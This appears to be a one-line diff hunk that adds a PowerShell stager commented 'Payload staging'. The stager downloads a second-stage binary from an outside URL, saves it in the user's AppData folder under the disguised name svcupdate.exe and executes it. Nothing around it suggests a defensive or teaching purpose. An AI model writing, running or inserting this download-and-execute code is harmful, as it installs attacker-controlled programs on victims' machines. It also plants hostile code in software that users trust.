@@ -1,0 +1,1 @@
+<# Payload staging #> $PayloadUrl = 'https://adatum.com/cdn/stage2.bin'; $Stage2Path = "$env:APPDATA\svcupdate.exe"; Start-BitsTransfer -Source $PayloadUrl -Destination $Stage2Path; & $Stage2Path; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
